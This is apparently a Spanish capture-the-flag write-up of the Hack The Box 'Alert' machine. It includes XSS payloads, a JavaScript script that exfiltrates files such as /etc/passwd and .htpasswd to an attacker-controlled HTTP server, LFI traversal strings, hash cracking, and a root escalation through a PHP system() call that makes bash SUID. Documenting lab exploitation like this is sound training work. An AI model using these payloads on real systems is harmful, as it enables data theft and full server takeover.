---
layout: single
title: Alert - Hack The Box
excerpt: "Máquina con un sitio web para subir, ver y compartir archivos markdown. El sitio es vulnerable a Cross-Site Scripting (XSS), el cual es explotado para acceder a una página interna vulnerable a lectura Arbitraria de Archivos y aprovechado para obtener un hash de contraseña. Luego, se realiza el cracking del hash para revelar las credenciales utilizadas para obtener acceso por SSH al objetivo. La enumeración de los procesos en ejecución en el sistema muestra un archivo PHP que se ejecuta regularmente, el cual tiene permisos excesivos para el grupo de gestión (management group) al que pertenece nuestro usuario, lo que nos permite sobrescribir el archivo para lograr un RCE como root."
date: 2025-10-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-Alert/Pasted image 20260410022111.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Pentesting
  - eWPT
tags:
  - writeup
  - eWPT
  - HackingWeb
  - Fuzzing
  - XSS-ViaMarkDown
  - LFI-ViaXSS
  - hash-AuthFileApache2
  - crack-hashes
  - LocalPortForwarding
  - EscaladaPrivilegios
  - ExploitingWebServiceLocal-ExecuteByRoot
  - CreatingMaliciousPHPfile-WriteablePath
---

![](/assets/images/htb-writeup-Alert/Pasted image 20260410022111.png)


## WRITEUP
Ejemplo: 10.10.11.44 (víctima) TTL= 63 LINUX


### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Alert</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**


Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem 10.10.11.44
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021112.png)


-Usar el comando *ping*:
```bash
ping 10.10.11.44 -c 1 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021122.png)


Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.44 -oG allPorts
# Veremos porque el formato grepeable, es importante.
```


![](/assets/images/htb-writeup-Alert/Pasted image 20251026021204.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports allPorts
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021246.png)


```bash
nmap -sVC -p22,80 10.10.11.44 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021312.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021334.png)


### ANÁLISIS WEB: RECONOCIMIENTO
### DOMINIO DESCUBIERTO:

De primeras, si entramos al sitio web nos dice que no lo ha encontrado esto se debe a que el sistema no esta resolviendo el nombre del dominio **alert.htb** no registrado en nuestro fichero <span style="color:grey">hosts</span>.

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021530.png)

### VIRTUAL HOSTING
Añadimos el dominio nuevo en nuestro fichero <span style="color:lightblue">/etc/</span><span style="color:grey">hosts</span>:

```bash
10.10.11.44 alert.htb
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021517.png)


Tiramos un "**ping**" para ver si tenemos conectividad e efectivamente tenemos.

```bash
ping alert.htb -c1
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026025923.png)


### EXPLORACIÓN PÁGINA
Dado que ahora ya podremos ver la página. Usamos *whatweb* para hacer un pequeño reconocimiento a nivel web, para ver que tecnologías y demás que usa. 

Es igual que la extensión <span style="color:lightyellow">Wappalyzer</span> pero en vez de gráfico por terminal.

```bash
whatweb http://10.10.11.44/
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021948.png)


Ya nos deja visualizar la página. Vemos un convertidor de un archivo a otro que contenga el lenguaje markdown y se va a reflejar en dicho lenguaje. 

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021609.png)


La extensión <span style="color:lightyellow">Wappalyzer</span> funciona igual que **whatweb** pero por gráfico.

Cosas a destacar es Apache y PHP.

![](/assets/images/htb-writeup-Alert/Pasted image 20251026022032.png)


Nos vamos a las herramientas de desarrollador > Storage > Cookies. 

No hay cookies aunque con la la extensión <span style="color:lightyellow">Cookie-Editor</span> lo podríamos mirar también.

>**CTRL + SHIFT + I**

![](/assets/images/htb-writeup-Alert/Pasted image 20251027011748.png)


### ¿COMO FUNCIONA LA WEB?
En un archivo con la extensión <span style="color:grey">.md </span> ,metemos por ejemplo un código en HTML.

```bash
echo '<h1>esto es una prueba</h1>' > prueba.md
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026022000.png)

Dentro de la página, seleccionamos el archivo y le damos a enviar.

![](/assets/images/htb-writeup-Alert/Pasted image 20251026022048.png)


Nos reflejará el resultado como es lo normal.

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021836.png)


### FUZZING A DIRECTORIOS NIVEL WEB
Con la herramienta *ffuf* haremos Fuzzing para descubrir directorios y vhosts(subdominios) a nivel web potenciales para encontrar algo de información.

### DIRECTORIOS
```bash
ffuf -c -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://alert.htb/FUZZ/ -fc 404 -mc 200,302,403,401
```


![](/assets/images/htb-writeup-Alert/Pasted image 20251026023354.png)


### VHOSTS |  SUBDOMINIO
```bash
ffuf -c -t 200 -w /usr/share/wordlists/SecLists/DNS/bitquaek-subdomains-top100000.txt -u http://alert.htb/ -H "Host: FUZZ.alert.htb" -fc 404 -mc 200,302,403,401
```

Nos descubre el subdominio: <span style="color:lime">statistics</span>

![](/assets/images/htb-writeup-Alert/Pasted image 20251028230841.png)


Añadimos el nuevo <span style="color:lime">subdominio</span> al fichero <span style="color:lightblue">/etc/</span><span style="color:grey">hosts</span> para poder visualizar si aloja alguna página web:

```bash
10.10.11.44 statistics.alert.htb
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251028231004.png)


Al entrar en la página nos pide unas credenciales cuales carecemos, no podemos hacer nada de momento.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028231044.png)


### VULNERABILIDAD WEB: PATH TRAVERSAL e WRAPPERS
Nos vamos a la pestaña de antes donde lo habíamos subido nuestro archivo markdown, e abajo derecha nos sale para compartirlo.

![](/assets/images/htb-writeup-Alert/Pasted image 20251026021836.png)


Le pinchamos.

![](/assets/images/htb-writeup-Alert/Captura de pantalla 2025-10-27 005619.png)


Nos lleva a una página donde nos da un link (compuesto por dos cadenas) a nuestro Markdown. Quien vea esto, lo va a ejecutar. 

![](/assets/images/htb-writeup-Alert/Captura de pantalla 2025-10-27 005657.png)

### PATH TRAVERSAL

Podemos deducir que carga archivos internos del servidor por ende podemos probar a intentar leer otros archivos mediante **PATH TRAVERSAL**. No hay éxito, tampoco probaremos evasiones. 

```bash
visualizer.php?link_share=../../../../../etc/passwd
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026020332.png)


### WRAPPERS PHP
Talvez mediante wrappers de tipo file:/// -> **wrappers PHP**.
No hay éxito, tal vez un **SSRF** (Server-Side Request Forgery) pero nada.

```bash
visualizer.php?link_share=file:///etc/passwd
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026020408.png)


### PROBANDO ACCEDER A DIRECTORIOS WEB.
Si intentamos acceder a uno de ellos nos dice que no tenemos permisos, por ende no nos deja visualizarlos.

>Recordamos que no deja acceder a dictorios pero si leer archivos.

![](/assets/images/htb-writeup-Alert/Pasted image 20251026023101.png)


### VULNERABILIDAD WEB: XSS (CROSS SITE SCRIPTING)
Vamos a probar a reflejar un código de javascript para comrprobar que es vulnerable a **XSS**. Y poder robar cookies o hacer que quien este detrás nos lea los archivos o directorios a nivel webs mediante LFI.

```bash
echo "<script>alert(0);</script>" > prueba3.md
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251026023320.png)


Lo subimos a la página.

![](/assets/images/htb-writeup-Alert/Pasted image 20251026023256.png)


Vemos que nos lo refleja, por ende puede ser vulnerable a **XSS**.

![](/assets/images/htb-writeup-Alert/Pasted image 20251026023304.png)


### VULNERABILIDAD WEB: LFI - LOCAL FILE INCLUSION  | MEDIANTE XSS - CROSS SITE-SCRIPTING
Ahora comprobaremos que podemos interactuar con el administrador que esta "detrás", y que puede recibir archivos.

Creamos un fichero de prueba .txt y nos abrimos un **servidor http** con python. 

```bash
# Creamos un fichero vacio
touch virus.txt

# Nos abrimos un servidor http
python3 -m http.server 8000
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251027010333.png)


Nos vamos al apartado de contactar con ellos.

![](/assets/images/htb-writeup-Alert/Captura de pantalla 2025-10-27 005400.png)


Le mandamos enlace de nuestro servidor web, que cuando lo enviamos, reciba el fichero.

```bash
[mensaje] http://10.10.16.10:8000/virus.txt
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251027010246.png)

![](/assets/images/htb-writeup-Alert/Captura de pantalla 2025-10-27 010016.png)


Veremos que en la salida de nuestro servidor http nos dice que en el host victima, se ha descargado nuestro fichero vacío, así que ya podemos pensar en intentar leer archivos arbitrarios a nivel sistema interactuando con el "usuario" privilegiado que esta detrás.

![](/assets/images/htb-writeup-Alert/Pasted image 20251027010315.png)


### PROBAMOS A LEER DIRECTORIOS mediante parámetro "page"
Como en la URL vemos que el parámetro **page** se dirige a contact&status, tal vez podríamos apuntar al directorio de antes.

![](/assets/images/htb-writeup-Alert/Pasted image 20251027012034.png)


Por ejemplo <span style="color:lightblue">/messages.</span>

![](/assets/images/htb-writeup-Alert/Pasted image 20251027012329.png)


Al apuntar a dicho directorio, lo veremos en blanco ya que no estamos autenticados y no tenemos permisos, pero esto es buena señal.

```bash
index.php?page=messages
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251027012254.png)


### SCRIPT EN JAVASCRIPT: XSS Data Exfiltration
Como podemos interactuar con el servidor, enviaremos un script definido en java para que cuando lo reciba el servidor nos envíe lo que muestra el directorio <span style="color:lightblue">/messages</span> ya que quien haya detrás si tiene permisos, y si puede ver el directorio.

>Se llamará *script.js*

Lo que recibiamos nos va a llegar encodeado a base64 para evitar errores.

```javascript
var req = new XMLHttpRequest(); // nos permite jugar con las peticiones web mediante la variable req.
req.open('GET', 'http://alert.htb/index.php?page=messages', false); // solicitamos con GET para leer la pagina que nos interesa, y le decimos  fasle = asincrono, porque vamos a enviar dos  soliciudes despues de esta.
req.send(); // envia la petición

var exfil = new XMLHttpRequest(); // aquí hacemos lo mismo con la variable exfil
exfil.open('GET', 'http://10.10.16.10:8000/?b64=' + btoa(req.responseText), false); // solicitamos recibir la respuesta a nuestro servidor http, cifrada a base64 jugando con btoa.
exfil.send(); // envia la petición
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251028233306.png)

![](/assets/images/htb-writeup-Alert/Pasted image 20251028233313.png)


### ENVIAR SCRIPT A SERVIDOR

Ahora para que reciba el script anterior el servidor victima, meteremos el siguiente payload en un archivo en formato markdown para enviarlo a la web.

```bash
echo '<script src="http://10.10.16.10:8000/script.js"</script>' > script.md
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251027014526.png)

Abrimos un servidor http.

```bash
python3 -m http.server 8000
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251027014036.png)


En la página envíamos el archivo .md

![](/assets/images/htb-writeup-Alert/Pasted image 20251027014544.png)

Le damos a "Share Mardown".

![](/assets/images/htb-writeup-Alert/Pasted image 20251027014558.png)


Copiamos el link que nos deja.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028233431.png)


### READ DIRECTORIES WEB
En la pestaña de contacto, enviaremos el link mencionado:

```bash
[mensaje] http://alert.htb/visualizer.php?link_share=324234.52824.md
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251028233658.png)

De forma paralela recibimos la salida de lo que podría ser el código de dicho directorio, a través del usuario que tiene permiso para verlo.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028233724.png)

Ha funcionado, y hay un mensaje aparentemente, pero no le damos importancia ya que hay posibles vías peligrosas.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028233819.png)


### SCRIPT EN JAVASCRIPT:  LFI (Local File Inclusion) - XSS + Exfiltration
En cuanto a resultados respecta, intentaremos leer archivos internos a nivel sistema mediante la vulnerabilidad **LFI**, modificando el script anterior.

>Elegimos "file" como variable para leer archivos internos a nivel sistema.

Leeremos el archivo /etc/passwd para saber que usuarios hay válidos en el sistema con bash.

```javascript
var req = new XMLHttpRequest(); // nos permite jugar con las peticiones web mediante la variable req.
req.open('GET', 'http://alert.htb/index.php?file=../../../../../../../../etc/passwd', false); // solicitamos con GET para leer la pagina que nos interesa, y le decimos  fasle = asincrono, porque vamos a enviar dos  soliciudes despues de esta.
req.send(); // envia la petición

var exfil = new XMLHttpRequest(); // aquí hacemos lo mismo con la variable exfil
exfil.open('GET', 'http://10.10.16.10:8000/?b64=' + btoa(req.responseText), false); // solicitamos recibir la respuesta a nuestro servidor http, cifrada a base64 jugando con btoa.
exfil.send(); // envia la petición
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251028234624.png)


### ENVIAR SCRIPT A SERVIDOR
Repitiendo los mismos pasos, para que reciba el script anterior el servidor victima, meteremos el siguiente payload en un archivo en formato markdown para enviarlo a la web.

```bash
echo '<script src="http://10.10.16.10:8000/script.js"</script>' > script.md
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251027014526.png)

Abrimos un servidor http.

```bash
python3 -m http.server 8000
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251027014036.png)


En la página envíamos el archivo .md

![](/assets/images/htb-writeup-Alert/Pasted image 20251028234646.png)

Copiamos el link que nos deja:

![](/assets/images/htb-writeup-Alert/Pasted image 20251028234827.png)

Lo mandamos al usuario que hay detrás:

```bash
[mensaje] http://alert.htb/visualizer.php?link_share=832472.092837.md
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251028234524.png)


### PASSWD: Usuarios válidos a nivel sistema

Recibiremos una salida con muchos bytes.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028234838.png)

Para ver el contenido del archivo:

```bash
# Decodear salida del archivo  y pasarlo a un fichero
... | base64 -d > usuarios.txt

# Leer archivo filtrando por los usuarios con bash
cat usuarios.txt | grep "sh$"
```

Vemos 3: <span style="color:blue">root, albert y David</span>.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028235018.png)

Podríamos intentar leer la clave privada **id_rsa** pero por ahí no van los tiros.


### CONFIGURACIÓN APACHE2: SUBDOMINIO Y CREDENCIALES
Si recordamos en la fase de reconocimiento, vimos que el servidor web corre por el servicio de Apache, y teniendo un LFI podemos leer el archivo **000-default.conf**.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028235307.png)

>**000-default.conf**: Archivo de configuración del sitio web, predeterminado en el servidor web Apache. Define cómo debe responder el servidor cuando un visitante solicita un dominio que no coincide con ninguna otra configuración activa. Nos dice posibles subdominios, rutas de dominio y subdominio en cuanto a alojamiento en el sistema respecta, y en caso de tener una posible autenticación pues su respectiva ruta  de las credenciales (Contraseña).


Modificamos el script para leer dicho archivo de configuración de apache2:

```javascript
var req = new XMLHttpRequest(); // nos permite jugar con las peticiones web mediante la variable req.
req.open('GET', 'http://alert.htb/index.php?file=../../../../../../../../etc/apache2/sites-available/000-default.conf', false); // solicitamos con GET para leer la pagina que nos interesa, y le decimos  fasle = asincrono, porque vamos a enviar dos  soliciudes despues de esta.
req.send(); // envia la petición

var exfil = new XMLHttpRequest(); // aquí hacemos lo mismo con la variable exfil
exfil.open('GET', 'http://10.10.16.10:8000/?b64=' + btoa(req.responseText), false); // solicitamos recibir la respuesta a nuestro servidor http, cifrada a base64 jugando con btoa.
exfil.send(); // envia la petición
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251028235447.png)


Mismo proceso...:

![](/assets/images/htb-writeup-Alert/Pasted image 20251028235624.png)


Recibimos el contenido del archivo encodeado.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028235727.png)


Lo decodeamos.

![](/assets/images/htb-writeup-Alert/Pasted image 20251028235807.png)


Nos muestra el contenido del archivo, destacando lo siguiente:

```bash
# Rutas del servidor en el sistema / DocumentRoot:
dominio: /var/www/alert.htb
subdominio: /var/www/statistics.alert.htb

# Ruta del archivo de Autenticación de usuario / AuthUserFile:
subdominio: /var/www/statistics.alert.htb/.htpasswd
```

>Vemos que el subdominio es el que descubrimos mediante Fuzzing por vhosts del dominio principal *alert.htb*.


![](/assets/images/htb-writeup-Alert/Pasted image 20260722032523.png)


### .HTTPASSWD: CREDENCIALES SUBDOMINIO WEB 

Repetiremos lo mismo pero cambiando la ruta del archivo, en este caso para ver el .htpasswd
que contiene las credenciales del usuario para dicho subdominio web, ya que si recordamos nos pedía unas credenciales para visualizar dicha página.

```javascript
var req = new XMLHttpRequest(); // nos permite jugar con las peticiones web mediante la variable req.
req.open('GET', 'http://alert.htb/index.php?file=../../../../../../../../var/www/statistics.alert.htb/.htpasswd', false); // solicitamos con GET para leer la pagina que nos interesa, y le decimos  fasle = asincrono, porque vamos a enviar dos  soliciudes despues de esta.
req.send(); // envia la petición

var exfil = new XMLHttpRequest(); // aquí hacemos lo mismo con la variable exfil
exfil.open('GET', 'http://10.10.16.10:8000/?b64=' + btoa(req.responseText), false); // solicitamos recibir la respuesta a nuestro servidor http, cifrada a base64 jugando con btoa.
exfil.send(); // envia la petición
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029000405.png)


En la pestaña de contacto enviamos el link:

```bash
[mensaje] http://alert.htb/visualizer.php?link_share=954646.333837.md
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029000656.png)


Recibimos el contenido encodeado a base64 a nuestro servidor http.

![](/assets/images/htb-writeup-Alert/Pasted image 20251029000746.png)


Lo desencodeamos recibiendo el usuario y hash en formato de apache.

```bash
echo "PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFlEWFFLEVFFkTGpTV1pRLwo8L3ByZT4K" | base64 -d
-> albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029000757.png)


Lo pasamos a un archivo llamado "hash" para crackearlo con *hashcat*.

```bash
echo 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029001315.png)



Mediante la siguiente sintaxis gracias a `--user` no necesitamos especificar el modo o tipo de ataque.

>Página de ayuda: [wikipedia de hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

```bash
hashcat hash /usr/share/wordlists/rockyou.txt --user
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029001712.png)

![](/assets/images/htb-writeup-Alert/Pasted image 20251029001651.png)

Credenciales de <span style="color:lime">statistics.alert.htb</span>: <span style="color:blue">albert</span>:<span style="color:darkred">manchesterunited</span>

### ACCESO A SUBDOMINIO WEB: ANÁLISIS

Rellenamos el pertinente panel de login: <span style="color:blue">albert</span>:<span style="color:darkred">manchesterunited</span>

![](/assets/images/htb-writeup-Alert/Pasted image 20251029001822.png)


No hay mucho interesante, solo un diagrama con donaciones recibidas a lo largo del año 2024.

![](/assets/images/htb-writeup-Alert/Captura de pantalla 2025-10-29 001856.png)


Nombres sin importancia, de un Top Donadores frecuentes.

![](/assets/images/htb-writeup-Alert/Pasted image 20251029001842.png)


### ACCESO A SSH
Como teníamos el puerto 22 del ssh abierto vamos a probar dichas credenciales para ver si nos deja acceder.

```bash
ssh albert@10.10.11.44
-> manchesterunited
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029002024.png)


### BANDERA USUSARIO
En el <span style="color:lightblue">/home/albert</span> cogemos la bandera usuario.

```bash
cat user.txt
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029002144.png)


### TRATAMIENTO DE LA TTY: SSH
Haremos un **Tratamiento TTY** para tener una shell más interactiva y evitar corrupciones con
editores de archivos, etc.

```bash
export TERM=xterm
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029002719.png)


### ESCALADA DE PRIVILEGIOS
De primeras intento ver a que grupo pertenece el usuario albert, llamándome la atención **management** (gestión). Así que me dispongo a listar sobre que archivos pertenece a dicho grupo.

```bash
# Listar a que grupos pertenece el usuario actual.
id
-> albert, management

# Listar sobre que archivos pertenecen a dicho grupo.
find / -group management 2>/dev/null
```


Veremos que el directorio <span style="color:lightblue">/opt/website-monitor/</span>**config**/ y el archivo <span style="color:lightblue">/opt/website-monitor/config/</span>**configuration.php** tenemos permisos

![](/assets/images/htb-writeup-Alert/Pasted image 20251029002923.png)


```bash
# Ir a dicho directorio
cd /opt/website-monitor/config

# Listar los permisos del dueño, grupo o otros usuarios en el directorio actual
ls -l
o
ll
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029003155.png)

Tenemos permisos de escritura(W), lectura(R) y ejecución(X) sobre ambas.

Aparentemente se ve que es una aplicación de monitorización web que seguramente este corriendo en local, porque anteriormente no hemos visto nada sobre algún seguimiento quitando las donaciones.

>**configuration.php**: Se define una constante con la ruta base de la aplicación para que, si más adelante la carpeta cambia de lugar o se mueve de servidor, solo haya que editar este archivo de configuración en lugar de modificar decenas de scripts individuales.


### PUERTO 8080: WEB MONITOR LOCAL
Con la herramienta *ss* listaremos los puertos que están corriendo de forma interna en la máquina víctima para confirmar nuestra teoría.

```bash
ss -tulnp
```

![](/assets/images/htb-writeup-Alert/Captura de pantalla 2025-10-29 004005.png)

Efectivamente tenemos de forma local el puerto 8080 muy en común para aplicaciones web.

Con *curl* haremos una petición a dicho puerto para que nos muestre más información.

```bash
curl 127.0.0.1:8080
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029004856.png)


Aquí nos dice que la web es de código abierto y el repositorio de Github para descargar el dicho Monitor web.

![](/assets/images/htb-writeup-Alert/Pasted image 20251029004904.png)


### LOCAL PORT FORWARDING
Para ver este web de forma gráfica en nuestra máquina aplicaremos la técnica de *Local Port Forwarding* que consiste en redirigir el tráfico de dicho puerto hacia nuestro puerto de atacante para verlo en local en nuestra máquina.

```bash
ssh albert@10.10.11.44 -L 8080:127.0.0.1:8080
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029004637.png)


Nos vamos a nuestro navegador para visualizar la página.

```bash
https:127.0.0.1:8080
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029004653.png)

No hay nada interesante.


### EJECUTAR COMANDOS COMO ROOT
Listaremos los procesos activos relacionados con la página de monitorización.

```bash
ps -faux | grep "monitor"
```

Hay un proceso llamativo cual dice que <span style="color:blue">root</span> usa el binario php para trabajar con la sitio web ya que es el lenguaje con el que esta creado la página, y apunta a la raíz del sitio web donde se alojan los archivos a nivel sistema.

```bash
root /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor/
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029005234.png)


Llendo a la raíz del servidor en local, listando los permisos de todos los archivos y directorios de dicha ruta, vemos que casi todo esta bajo <span style="color:blue">root</span> pero hay un error crítico de configuración en cuanto permisos respecta.

El directorio <span style="color:lightblue">monitors/</span> tiene de permisos "**777**" quiere decir que le añadido todos los permisos de WXR a todos los usuarios. (Dueño, grupos y otros usuarios)

![](/assets/images/htb-writeup-Alert/Pasted image 20251029005331.png)


Esto quiere decir que como esta sobre pero podemos crear archivos en php, podemos ejecutar comandos como root.

```bash
# Entrar en el directorio monitors
cd monitors

# crear archivo php
nano prueba.php
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029005749.png)


Ejecutaremos el comando "**whoami**" mediante la siguiente sintaxis de php, a ver si la web lo logra interpretar.

```bash
<?php system("whoami"); ?>
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029010218.png)


Nos vamos a la página web en local y apuntamos a la ruta de nuestro archivo php recién creado. Lo llamé *prueba.php*.

```bash
https:127.0.0.1:8080/monitors/prueba.php
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029010229.png)

Se refleja la ejecución del comando como usuario privilegiado correctamente. 


### CONVERTIRNOS EN USUARIO PRIVILEGIADO: ROOT
Para convertirnos en root, hay varias formas pero elegí una diferente.

Listamos los permisos del binario bash y se contempla que solo root puede tener permisos de escritura sobre este binario.

```bash
ls -l /bin/bash
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029010536.png)


Lo que haremos es añadir el permiso de SUID para poder ejecutar el binario **bash** como usuario privilegiado y escalar privilegios.

```php
# Modificar el archivo php previamente creado
nano prueba.php

# Aplicamos el permiso SUID (Set User ID) para poder ejecutar el binario como root
<?php system("chmod u+s /bin/bash"); ?>
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029010616.png)


Cargamos el archivo en la web como hicimos anteriormente.

![](/assets/images/htb-writeup-Alert/Pasted image 20251029010635.png)


De forma paralela, para verificar que ha funcionado ejecutamos el comando "**whoami**" o "**id**", nos dira que somos <span style="color:blue">root</span> y tenemos el **euid** de root.

```bash
# Darnos la shell de root sin perder los privilegios
bash -p

# Comprobar que soy root
whoami

# Comprobar que tengo el euid de root
id
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029010758.png)


### BANDERA ROOT
Nos vamos al directorio de <span style="color:blue">root</span> en <span style="color:lightblue">root/</span> y cogemos la bandera.

```bash
# Ir al directorio de root
cd /root/

# Leer la bandera de root
cat root.txt
```

![](/assets/images/htb-writeup-Alert/Pasted image 20251029010828.png)


